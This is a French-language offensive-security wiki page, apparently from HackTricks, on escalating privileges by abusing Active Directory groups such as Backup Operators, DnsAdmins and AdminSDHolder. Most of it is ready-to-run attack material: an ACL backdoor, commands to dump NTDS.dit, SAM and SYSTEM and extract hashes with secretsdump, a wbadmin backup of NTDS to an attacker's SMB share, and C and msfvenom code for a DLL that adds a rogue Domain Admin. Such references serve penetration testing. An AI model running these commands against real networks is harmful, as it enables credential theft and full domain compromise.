# Groupes Privilégiés

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Utilisez [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) pour construire et **automatiser des flux de travail** facilement grâce aux **outils communautaires les plus avancés** au monde.\
Accédez dès aujourd'hui :

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

## Groupes Bien Connus avec des privilèges d'administration

* **Administrateurs**
* **Administrateurs de Domaine**
* **Administrateurs d'Entreprise**

## Opérateurs de Compte

Ce groupe est habilité à créer des comptes et des groupes qui ne sont pas des administrateurs sur le domaine. De plus, il permet la connexion locale au Contrôleur de Domaine (DC).

Pour identifier les membres de ce groupe, la commande suivante est exécutée :
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Ajouter de nouveaux utilisateurs est autorisé, ainsi que la connexion locale à DC01.

## Groupe AdminSDHolder

La liste de contrôle d'accès (ACL) du groupe **AdminSDHolder** est cruciale car elle définit les autorisations pour tous les "groupes protégés" au sein d'Active Directory, y compris les groupes à privilèges élevés. Ce mécanisme garantit la sécurité de ces groupes en empêchant les modifications non autorisées.

Un attaquant pourrait exploiter cela en modifiant l'ACL du groupe **AdminSDHolder**, accordant des autorisations complètes à un utilisateur standard. Cela donnerait effectivement à cet utilisateur un contrôle total sur tous les groupes protégés. Si les autorisations de cet utilisateur sont modifiées ou supprimées, elles seraient automatiquement rétablies dans l'heure en raison de la conception du système.

Les commandes pour examiner les membres et modifier les autorisations incluent :
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
Un script est disponible pour accélérer le processus de restauration : [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Pour plus de détails, visitez [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

L'appartenance à ce groupe permet la lecture des objets Active Directory supprimés, ce qui peut révéler des informations sensibles :
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Accès au Contrôleur de Domaine

L'accès aux fichiers sur le DC est restreint à moins que l'utilisateur ne fasse partie du groupe `Server Operators`, ce qui modifie le niveau d'accès.

### Escalade de Privilèges

En utilisant `PsService` ou `sc` de Sysinternals, on peut inspecter et modifier les permissions des services. Le groupe `Server Operators`, par exemple, a un contrôle total sur certains services, permettant l'exécution de commandes arbitraires et l'escalade de privilèges :
```cmd
C:\> .\PsService.exe security AppReadiness
```
Cette commande révèle que les `Server Operators` ont un accès complet, permettant la manipulation des services pour des privilèges élevés.

## Backup Operators

L'appartenance au groupe `Backup Operators` fournit un accès au système de fichiers `DC01` en raison des privilèges `SeBackup` et `SeRestore`. Ces privilèges permettent la traversée de dossiers, le listing et la copie de fichiers, même sans autorisations explicites, en utilisant le drapeau `FILE_FLAG_BACKUP_SEMANTICS`. L'utilisation de scripts spécifiques est nécessaire pour ce processus.

Pour lister les membres du groupe, exécutez :
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Local Attack

Pour tirer parti de ces privilèges localement, les étapes suivantes sont employées :

1. Importer les bibliothèques nécessaires :
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Activer et vérifier `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Accéder et copier des fichiers à partir de répertoires restreints, par exemple :
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

Un accès direct au système de fichiers du contrôleur de domaine permet le vol de la base de données `NTDS.dit`, qui contient tous les hachages NTLM pour les utilisateurs et les ordinateurs du domaine.

#### Using diskshadow.exe

1. Créez une copie de l'ombre du lecteur `C` :
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Copier `NTDS.dit` à partir de la copie de sauvegarde :
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternativement, utilisez `robocopy` pour la copie de fichiers :
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Extraire `SYSTEM` et `SAM` pour la récupération des hachages :
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Récupérer tous les hachages de `NTDS.dit` :
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### Utilisation de wbadmin.exe

1. Configurez le système de fichiers NTFS pour le serveur SMB sur la machine attaquante et mettez en cache les identifiants SMB sur la machine cible.
2. Utilisez `wbadmin.exe` pour la sauvegarde système et l'extraction de `NTDS.dit` :
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Pour une démonstration pratique, voir [VIDÉO DE DÉMO AVEC IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Les membres du groupe **DnsAdmins** peuvent exploiter leurs privilèges pour charger une DLL arbitraire avec des privilèges SYSTEM sur un serveur DNS, souvent hébergé sur des contrôleurs de domaine. Cette capacité permet un potentiel d'exploitation significatif.

Pour lister les membres du groupe DnsAdmins, utilisez :
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Exécuter un DLL arbitraire

Les membres peuvent faire en sorte que le serveur DNS charge un DLL arbitraire (soit localement, soit à partir d'un partage distant) en utilisant des commandes telles que :
```powershell
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Redémarrer le service DNS (ce qui peut nécessiter des autorisations supplémentaires) est nécessaire pour que le DLL soit chargé :
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Pour plus de détails sur ce vecteur d'attaque, référez-vous à ired.team.

#### Mimilib.dll
Il est également possible d'utiliser mimilib.dll pour l'exécution de commandes, en le modifiant pour exécuter des commandes spécifiques ou des shells inversés. [Consultez ce post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) pour plus d'informations.

### Enregistrement WPAD pour MitM
Les DnsAdmins peuvent manipuler les enregistrements DNS pour effectuer des attaques Man-in-the-Middle (MitM) en créant un enregistrement WPAD après avoir désactivé la liste de blocage des requêtes globales. Des outils comme Responder ou Inveigh peuvent être utilisés pour le spoofing et la capture du trafic réseau.

### Lecteurs de journaux d'événements
Les membres peuvent accéder aux journaux d'événements, trouvant potentiellement des informations sensibles telles que des mots de passe en clair ou des détails sur l'exécution de commandes :
```powershell
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Permissions Windows Exchange
Ce groupe peut modifier les DACL sur l'objet de domaine, accordant potentiellement des privilèges DCSync. Les techniques d'escalade de privilèges exploitant ce groupe sont détaillées dans le dépôt GitHub Exchange-AD-Privesc.
```powershell
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Administrateurs Hyper-V
Les administrateurs Hyper-V ont un accès complet à Hyper-V, ce qui peut être exploité pour prendre le contrôle des contrôleurs de domaine virtualisés. Cela inclut le clonage de DCs en direct et l'extraction des hachages NTLM du fichier NTDS.dit.

### Exemple d'exploitation
Le service de maintenance de Mozilla Firefox peut être exploité par les administrateurs Hyper-V pour exécuter des commandes en tant que SYSTEM. Cela implique de créer un lien dur vers un fichier SYSTEM protégé et de le remplacer par un exécutable malveillant :
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
Note : L'exploitation des liens durs a été atténuée dans les mises à jour récentes de Windows.

## Gestion de l'organisation

Dans les environnements où **Microsoft Exchange** est déployé, un groupe spécial connu sous le nom de **Gestion de l'organisation** détient des capacités significatives. Ce groupe a le privilège d'**accéder aux boîtes aux lettres de tous les utilisateurs du domaine** et maintient **un contrôle total sur l'Unité d'Organisation 'Groupes de sécurité Microsoft Exchange'**. Ce contrôle inclut le groupe **`Exchange Windows Permissions`**, qui peut être exploité pour l'escalade de privilèges.

### Exploitation des privilèges et commandes

#### Opérateurs d'impression
Les membres du groupe **Opérateurs d'impression** sont dotés de plusieurs privilèges, y compris le **`SeLoadDriverPrivilege`**, qui leur permet de **se connecter localement à un contrôleur de domaine**, de l'éteindre et de gérer les imprimantes. Pour exploiter ces privilèges, surtout si **`SeLoadDriverPrivilege`** n'est pas visible dans un contexte non élevé, il est nécessaire de contourner le Contrôle de compte d'utilisateur (UAC).

Pour lister les membres de ce groupe, la commande PowerShell suivante est utilisée :
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Pour des techniques d'exploitation plus détaillées liées à **`SeLoadDriverPrivilege`**, il convient de consulter des ressources de sécurité spécifiques.

#### Utilisateurs du Bureau à Distance
Les membres de ce groupe se voient accorder l'accès aux PC via le Protocole de Bureau à Distance (RDP). Pour énumérer ces membres, des commandes PowerShell sont disponibles :
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Des informations supplémentaires sur l'exploitation de RDP peuvent être trouvées dans des ressources de pentesting dédiées.

#### Utilisateurs de gestion à distance
Les membres peuvent accéder aux PC via **Windows Remote Management (WinRM)**. L'énumération de ces membres est réalisée par :
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Pour les techniques d'exploitation liées à **WinRM**, une documentation spécifique doit être consultée.

#### Opérateurs de serveur
Ce groupe a des permissions pour effectuer diverses configurations sur les contrôleurs de domaine, y compris des privilèges de sauvegarde et de restauration, le changement de l'heure système et l'arrêt du système. Pour énumérer les membres, la commande fournie est :
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## Références <a href="#references" id="references"></a>

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
* [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
* [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
* [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
* [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
* [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
* [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
* [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)

<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Utilisez [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) pour créer facilement et **automatiser des flux de travail** alimentés par les **outils communautaires les plus avancés** au monde.\
Obtenez l'accès aujourd'hui :

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR au** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts github.

</details>
{% endhint %}
